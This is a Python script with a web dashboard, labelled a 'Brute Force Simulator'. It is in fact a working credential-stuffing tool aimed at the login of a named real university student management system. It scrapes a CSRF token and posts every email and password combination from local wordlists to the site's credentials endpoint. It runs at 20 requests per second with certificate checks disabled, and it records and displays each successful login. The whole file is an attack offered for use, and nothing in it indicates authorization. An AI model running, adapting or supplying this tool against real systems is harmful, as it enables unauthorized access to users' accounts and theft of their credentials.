import asyncio
import aiohttp
import os
import json
import re
from aiohttp import web
from urllib.parse import urlparse, quote, urlencode

# =======================
# Config
# =======================
target_base = "https://sms.mzuni.ac.mw:443"  # target URL
proxychoice = "yes"                     # "yes" = use 127.0.0.1:8080, "no" = direct
proxy_url = "http://127.0.0.1:8080"
emails_file = "emails.txt"
passwords_file = "passwords.txt"
log_file = "log.json"
rate_limit = 20  # requests per second
# =======================

# Global variables for controlling the brute force process
brute_force_tasks = []
brute_force_running = False

# Progress log
def load_progress():
    progress_data = {
        "attempted_combinations": set(),
        "successful_combinations": []
    }
    
    if os.path.exists(log_file):
        try:
            with open(log_file, "r") as f:
                data = json.load(f)
                progress_data["attempted_combinations"] = set(data.get("attempted_combinations", []))
                progress_data["successful_combinations"] = data.get("successful_combinations", [])
        except:
            # If file is corrupted, start fresh
            pass
            
    return progress_data


def save_progress(email, password, success=False):
    progress_data = load_progress()
    combination = f"{email}:{password}"
    
    # Add to attempted combinations
    progress_data["attempted_combinations"].add(combination)
    
    # If successful, add to successful list
    if success and combination not in [s["combination"] for s in progress_data["successful_combinations"]]:
        progress_data["successful_combinations"].append({
            "combination": combination,
            "email": email,
            "password": password,
            "timestamp": asyncio.get_event_loop().time()
        })
    
    # Save to file
    with open(log_file, "w") as f:
        json.dump({
            "attempted_combinations": list(progress_data["attempted_combinations"]),
            "successful_combinations": progress_data["successful_combinations"]
        }, f, indent=2)


# Global event queue for SSE
event_queue = asyncio.Queue()

# Global list for successful attempts
successful_attempts = []


async def send_event(msg: str):
    await event_queue.put(msg)


# Get CSRF token by making a GET request to the login page
async def get_csrf_token(session):
    try:
        proxy_arg = proxy_url if proxychoice.lower() == "yes" else None
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6178.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        async with session.get(
            f"{target_base}/login",
            headers=headers,
            proxy=proxy_arg,
            timeout=10,
            ssl=False
        ) as resp:
            if resp.status == 200:
                html = await resp.text()
                # Look for CSRF token in the HTML
                csrf_patterns = [
                    r'name="csrfToken" value="([^"]+)"',
                    r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'X-CSRF-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                ]
                
                for pattern in csrf_patterns:
                    match = re.search(pattern, html)
                    if match:
                        token = match.group(1)
                        await send_event(f"[INFO] Found CSRF token: {token}")
                        return token
                
                await send_event("[WARNING] Could not find CSRF token in HTML, using fallback")
                # Fallback: try to get from cookies or headers
                cookies = session.cookie_jar.filter_cookies(target_base)
                for cookie in cookies:
                    if 'csrf' in cookie.key.lower():
                        await send_event(f"[INFO] Using CSRF cookie: {cookie.value}")
                        return cookie.value
                
                return "fallback_csrf_token"
            else:
                await send_event(f"[WARNING] Failed to get login page: {resp.status}")
                return "fallback_csrf_token"
                
    except Exception as e:
        await send_event(f"[ERROR] Failed to get CSRF token: {e}")
        return "fallback_csrf_token"


# Worker to brute force one email against all passwords
async def brute_email(session, sem, email, passwords, csrf_token, progress_data):
    for pwd in passwords:
        combination = f"{email}:{pwd}"
        
        # Check if we should stop
        if not brute_force_running:
            await send_event(f"[STOPPED] {email}:{pwd}")
            return
            
        # Skip if already attempted
        if combination in progress_data["attempted_combinations"]:
            await send_event(f"[SKIP] Already attempted: {email}:{pwd}")
            continue
            
        await sem.acquire()
        try:
            # Prepare form data
            form_data = {
                "redirect": "false",
                "email": email,
                "password": pwd,
                "csrfToken": csrf_token,
                "callbackUrl": "https://sms.mzuni.ac.mw/login",
                "json": "true"
            }
            
            # URL encode the form data
            encoded_data = urlencode(form_data)
            
            headers = {
                "Host": urlparse(target_base).hostname,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6178.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": target_base,
                "Referer": f"{target_base}/login",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
            
            proxy_arg = proxy_url if proxychoice.lower() == "yes" else None
            
            # Send POST request
            async with session.post(
                f"{target_base}/api/auth/callback/credentials",
                data=encoded_data,
                headers=headers,
                proxy=proxy_arg,
                timeout=10,
                ssl=False,
                allow_redirects=False
            ) as resp:
                status = resp.status
                response_text = await resp.text()
                
                if status == 200:
                    await send_event(f"[SUCCESS] {email}:{pwd}")
                    save_progress(email, pwd, success=True)
                    successful_attempts.append(f"{email}:{pwd}")
                elif status == 401:
                    await send_event(f"[FAIL] {email}:{pwd}")
                    save_progress(email, pwd, success=False)
                elif status == 302:
                    # Redirect might indicate success
                    location = resp.headers.get('Location', '')
                    if 'error' not in location.lower():
                        await send_event(f"[SUCCESS-REDIRECT] {email}:{pwd} -> {location}")
                        save_progress(email, pwd, success=True)
                        successful_attempts.append(f"{email}:{pwd}")
                    else:
                        await send_event(f"[FAIL-REDIRECT] {email}:{pwd} -> {location}")
                        save_progress(email, pwd, success=False)
                else:
                    await send_event(f"[INTERESTING {status}] {email}:{pwd} - Response: {response_text[:100]}")
                    save_progress(email, pwd, success=False)
                    
        except Exception as e:
            await send_event(f"[ERROR] {email}:{pwd} -> {str(e)[:100]}")
            save_progress(email, pwd, success=False)
        finally:
            await asyncio.sleep(1 / rate_limit)
            sem.release()


# Main brute logic
async def brute_main():
    global brute_force_running, brute_force_tasks
    brute_force_running = True
    
    # Load inputs
    if not os.path.exists(emails_file):
        await send_event(f"[ERROR] Emails file '{emails_file}' not found")
        brute_force_running = False
        return
        
    if not os.path.exists(passwords_file):
        await send_event(f"[ERROR] Passwords file '{passwords_file}' not found")
        brute_force_running = False
        return
        
    with open(emails_file) as f:
        emails = [line.strip() for line in f if line.strip()]
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    progress_data = load_progress()
    
    # Count how many combinations we've already attempted
    attempted_count = len(progress_data["attempted_combinations"])
    total_combinations = len(emails) * len(passwords)
    remaining = total_combinations - attempted_count
    
    if remaining <= 0:
        await send_event("[INFO] All combinations already attempted.")
        brute_force_running = False
        return

    await send_event(f"[INFO] Starting attack. Already attempted: {attempted_count}/{total_combinations}")
    await send_event(f"[INFO] Remaining combinations: {remaining}")
    await send_event(f"[INFO] Successful so far: {len(progress_data['successful_combinations'])}")

    sem = asyncio.Semaphore(rate_limit)
    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar()) as session:
        # Get CSRF token
        csrf_token = await get_csrf_token(session)
        await send_event(f"[INFO] Using CSRF token: {csrf_token}")
        
        tasks = []
        for email in emails:
            if not brute_force_running:
                break
            task = asyncio.create_task(brute_email(session, sem, email, passwords, csrf_token, progress_data))
            tasks.append(task)
            brute_force_tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    brute_force_running = False
    await send_event("[INFO] Brute force completed")


# Stop the brute force process
async def stop_brute():
    global brute_force_running, brute_force_tasks
    brute_force_running = False
    
    # Cancel all running tasks
    for task in brute_force_tasks:
        if not task.done():
            task.cancel()
    
    brute_force_tasks = []
    await send_event("[INFO] Brute force stopped by user")


# =======================
# Web UI
# =======================

async def handle_index(_):
    # Load successful attempts for display
    progress_data = load_progress()
    success_list = "\n".join([f"<li>{s['combination']}</li>" for s in progress_data["successful_combinations"]])
    success_count = len(progress_data["successful_combinations"])
    
    return web.Response(
        text=f"""
<!DOCTYPE html>
<html>
<head>
  <title>Brute Force Simulator</title>
  <style>
    body {{ font-family: Arial, sans-serif; margin: 20px; }}
    button {{ padding: 10px 20px; font-size: 16px; margin-bottom: 20px; margin-right: 10px; }}
    .start {{ background-color: #4CAF50; color: white; }}
    .stop {{ background-color: #f44336; color: white; }}
    .container {{ display: flex; gap: 20px; }}
    .output, .success {{ 
        background: #f4f4f4; 
        padding: 10px; 
        border: 1px solid #ddd; 
        height: 500px; 
        overflow-y: auto;
        flex: 1;
    }}
    .success {{ background: #e8f5e9; }}
    h3 {{ margin-top: 0; }}
  </style>
</head>
<body>
  <h2>Clusterbomb Brute Force Simulator</h2>
  <button class="start" onclick="startBrute()">Start Brute Force</button>
  <button class="stop" onclick="stopBrute()">Stop Brute Force</button>
  
  <div class="container">
    <div class="output">
      <h3>Attack Log</h3>
      <pre id="out"></pre>
    </div>
    
    <div class="success">
      <h3>Successful Attempts ({success_count})</h3>
      <ul id="success-list">
        {success_list}
      </ul>
    </div>
  </div>
  
  <script>
    const out = document.getElementById('out');
    const successList = document.getElementById('success-list');
    let eventSource = null;
    
    function startBrute() {{
      // Stop any existing connection
      if (eventSource) {{
        eventSource.close();
      }}
      
      fetch('/start');
      eventSource = new EventSource('/events');
      eventSource.onmessage = e => {{
        const data = e.data;
        out.textContent += data + "\\n";
        out.scrollTop = out.scrollHeight;
        
        // If it's a success, add to the success list
        if (data.includes('[SUCCESS]')) {{
          const combination = data.split('[SUCCESS] ')[1];
          const li = document.createElement('li');
          li.textContent = combination;
          successList.appendChild(li);
        }}
      }};
    }}
    
    function stopBrute() {{
      fetch('/stop');
      if (eventSource) {{
        eventSource.close();
        eventSource = null;
      }}
    }}
  </script>
</body>
</html>
""",
        content_type="text/html",
    )


async def handle_start(_):
    asyncio.create_task(brute_main())
    return web.Response(text="started")


async def handle_stop(_):
    await stop_brute()
    return web.Response(text="stopped")


async def handle_events(request):
    response = web.StreamResponse(
        status=200,
        reason='OK',
        headers={
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
        }
    )
    await response.prepare(request)
    
    try:
        while True:
            msg = await event_queue.get()
            await response.write(f"data: {msg}\n\n".encode())
            await asyncio.sleep(0.1)
    except Exception as e:
        print(f"SSE connection closed: {e}")
    finally:
        return response


def main():
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/events", handle_events)
    app.router.add_get("/start", handle_start)
    app.router.add_get("/stop", handle_stop)
    web.run_app(app, port=8081, host='0.0.0.0')


if __name__ == "__main__":
    main()